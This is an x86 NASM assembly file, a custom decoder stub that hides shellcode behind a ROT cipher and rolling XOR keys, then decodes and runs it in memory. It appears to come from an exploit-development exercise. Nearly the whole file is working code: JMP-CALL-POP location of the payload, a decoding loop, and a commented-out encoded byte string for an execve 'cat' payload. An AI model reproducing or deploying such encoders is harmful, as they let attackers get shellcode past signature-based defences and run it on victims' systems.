; Filename: custom_decoder.nasm
; Author:  Plaix
; Website:  http://slacklabs.be
;
; Purpose: 
; Custom decoder stub for execve_cat_jcp.nasm
; During encoding the shellcode is split up into definable even blocks of h
; where h is used for a rot-h cypher on the bytes
; random bytes then get added between the groups of h bytes
; these random bytes are then used as a xor encoding key for the following x bytes
; first byte is the ROT decypher key 
; Works with 0xFF as a marker to indicate decoding is finished and shellcode can be ran
; [rot][xorkeyfirst h bytes][encodedopcode] x h [xorkeynexthbytes][encodedopcode] x h ....[xor encoded \x00 padding if required][0xFFmarker]

global _start			

section .text
_start:

	jmp short Call_shellcode
shellcode:
	; JMP CALL POP to get to shellcode in esi
	pop esi
	mov edi,esi

	; optimized	
	; xor eax,eax

	; Load ROT cypher in edx
	; first byte is the ROT cypher key
	
	; optimized
	; xor edx,edx

	mov byte dl,[edi]
	; skip rot cypher key
	inc esi

decoder:
	 xor ecx,ecx
	 xor ebx,ebx

	; load rot cypher key in ecx again to set next loop counter
	mov byte cl,dl
	; xor key for next loop
	mov byte bl,[esi]
	inc esi
		
	; keep decoding until we hit marker in groups of x
	; where x is cl	

	
decode:
	; xor decode
	xor byte [esi],bl
	; and roll back the rot
	sub byte [esi],dl
	; overwrite the correct bytes by using edi as a pointer to sh
	mov al, byte [esi]	
	mov byte [edi], al	
	inc edi	
	inc esi
	loop decode
		
	; if we hit marker jump to shellcode
	; optimization
	;mov al, byte [esi]
	;xor byte al, 0xFF
	;jz sh	
	;
	test byte [esi],0xFF
	je sh
	; end optimization
	jmp short decoder


Call_shellcode:
	call shellcode
	sh: db 0xff
	;sh: db 0x04,0x50,0x65,0x8f,0xab,0xb7,0x87,0xd0,0xc0,0xd0,0xe9,0x1d,0x1b,0xa9,0x77,0x90,0x29,0xcc,0xf8,0xad,0xb2,0x2e,0x71,0x42,0xea,0x82,0xfb,0xc7,0xf5,0x97,0xfd,0xbb,0xbf,0xae,0xdb,0x36,0xa2,0x47,0xcc,0xc8,0xfe,0xf4,0xa0,0xa1,0xaf,0x79,0x83,0x66,0xc4,0x52,0x07,0xd0,0x66,0xdb,0x6d,0xd4,0x89,0x9d,0x8d,0x8d,0x04,0x14,0xf3,0xd1,0xfb,0x04,0x46,0x83,0xa1,0x56,0xf2,0xfb,0x7a,0x2a,0x7f,0xa4,0x16,0x9b,0xf3,0x8b,0xac,0x97,0x87,0x23,0x90,0x46,0xf8,0x7c,0xfb,0x1d,0xcd,0xd0,0x0f,0xbe,0xd5,0x8c,0x83,0x52,0x07,0xb6,0x5c,0x8d,0xe3,0x88,0xd1,0x5c,0xfa,0x7e,0xfe,0xfe,0xfe,0xff
